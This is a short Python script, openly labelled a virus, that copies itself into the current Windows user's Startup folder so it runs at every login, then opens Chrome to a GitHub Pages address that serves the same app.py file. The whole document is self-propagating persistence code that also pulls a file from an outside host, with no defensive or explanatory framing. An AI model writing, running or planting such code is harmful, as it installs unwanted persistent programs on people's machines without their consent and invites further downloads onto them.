import os
import shutil
import getpass

USER_NAME = getpass.getuser()
def copyvirus():
    file_path = os.path.dirname(os.path.realpath(__file__))
    shutil.copyfile(r'%s\app.py' % file_path , r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\app.py' % USER_NAME)
copyvirus()
def virus():
    os.system('start chrome https://sivertillya.github.io/db/app.py')
virus()
